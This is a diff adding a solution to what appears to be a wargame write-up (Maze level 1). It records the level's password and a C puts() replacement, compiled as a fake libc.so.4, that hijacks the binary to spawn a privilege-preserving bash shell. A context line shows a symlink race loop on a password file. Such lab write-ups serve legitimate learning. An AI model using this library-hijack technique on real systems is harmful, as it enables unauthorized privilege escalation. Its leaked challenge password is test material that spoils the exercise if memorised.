@@ -56,8 +56,40 @@ $ while [ 1 ]; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918
 ###################################################################################################
 
 Level:     1
-Exploit:   
-Password:  
+Exploit:   function hooking
+Password:  PBeZRPjetr
+
+Exploit mitigations: NX
+
+Running the program results in the following:
+$ ./maze1
+error while loading shared libraries: ./libc.so.4: cannot open shared object file: 
+No such file or directory.
+
+This means that the binary was meant to use libc.so.4 shared library but the loader cannot find
+such a file.
+
+ghidra decompile:
+int main(void) {
+  puts("Hello World!\n");
+  return 0;
+}
+
+Attempt to hook puts with a custom libc.so.4 
+Perhaps modify puts to open shell 
+
+custom puts implementation:
+  #include <unistd.h>
+  int puts(const char* str) {
+	  char *const argv[] = {"/bin/bash", "-p" NULL};            <-- priviledge preserve flag
+		char *const envp[] = {NULL};
+	  execve("/bin/bash", argv, envp);
+    return 0;
+  }
+
+$ gcc -m32 -c -fPIC -fno-stack-protector custom_puts.c 
+$ ld -shared -m elf i386 -o libc.so.4 custom_puts.o -ldl
+
 
 ###################################################################################################
 
